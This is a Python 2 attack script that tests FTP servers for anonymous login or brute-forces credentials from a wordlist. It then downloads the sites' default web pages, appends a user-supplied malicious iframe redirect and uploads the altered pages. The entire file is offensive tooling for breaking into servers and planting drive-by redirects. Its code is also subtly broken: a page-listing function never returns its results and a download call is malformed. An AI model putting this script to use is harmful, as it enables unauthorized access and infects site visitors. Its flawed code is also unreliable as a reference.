import ftplib
import optparse
import os
import sys
import time

def anonLogin(hostname):
        try:
                ftp = ftplib.FTP(hostname)
                ftp.login("anonymous", "me@your.com")
                print "\n[*] " + str(hostname) + " FTP Anonymous Logon succeeded."
                ftp.quit()
                return True
        except Exception, e:
                print "\n[-] " + str(hostname) + " FTP Anonymous Logon failed."

                return False

def bruteLogin(hostname, passwdFile):
        pF = open(passwdFile, "r")
        for line in pF.readlines():
                userName = line.split(":")[0]
                passWord = line.split(":")[1].strip("\r").strip("\n")
                print "[+] Trying: " + userName + "/"+passWord
                try:
                        ftp = ftplib.FTP(hostname)
                        ftp.login(userName, passWord)
                        print "\n[*] " + str(hostname) + " FTP Logon succeeded: " + userName + "/"+passWord
                        ftp.quit()
                        return (userName, passWord)
                except Exception, e:
                        pass
        print "\n[-] Can not brute-force FTP credentials."
        return (None, None)

def returnDefault(ftp):
        try:
                dirList = ftp.nlst()
        except:
                dirList = []
                print "[-] Could not list directory contents."
                print "[-] Skipping to next target."
                return
        retList = []
        for fileName in dirList:
                fn = fileName.lower()
                if ".php" in fn or ".htm" in fn or ".asp" in fn or ".html" in fn:
                        print "[+] Found default page: " + fileName
                        retList.append(fileName)

def injectPage(ftp, page, redirect):
        f = open(page + ".tmp", "w")
        ftp.retrlines("RETR " + page + f.write)
        print "[+] Downloaded Page: " + page
        f.write(redirect)
        f.close()
        print "[+] Injected Malicious IFrame on: " + page
        ftp.storlines("STOR " + page, open(page + ".tmp"))
        print "[+] Uploaded injected Page: " + page

def attack(username, password, tgtHost, redirect):
	ftp = ftplib.FTP(tgtHost)
	ftp.login(username, password)
	defPages = returnDefault(ftp)
	for defPage in defPages:
		injectPage(ftp, defPage, redirect)

def main():
        parser = optparse.OptionParser("Usage requires -H <target host[s]> -r <redirect page> [-f <userpass file>]")
        parser.add_option("-H", dest="tgtHosts", type="string", help="specify the host")
	parser.add_option("-f", dest="passwdFile", type="string", help="specify user/password file")
	parser.add_option("-r", dest="redirect", type="string", help="specify a redirection page")
        (options, args) = parser.parse_args()
	tgtHosts = str(options.tgtHosts).split(", ")
	passwdFile = options.passwdFile
	redirect = options.redirect
	if tgtHosts == None or redirect == None:
		print parser.usage
		exit(0)
	for tgtHost in tgtHosts:
		username = None
		password = None
		if anonLogin(tgtHost) == True:
			username = "anonymous"
			password = "me@your.com"
			print "[+] Using anonymous creds to attack"
			attack(username, password, tgtHost, redirect)
		elif passwdFile != None:
			(username, password) = bruteLogin(tgtHost, passwdFile)
		if password != None:
			print "[+] Using creds " + username + "/" + password + " to attack"
			attack(username, password, tgtHost, redirect)

if __name__ == "__main__":
	main()
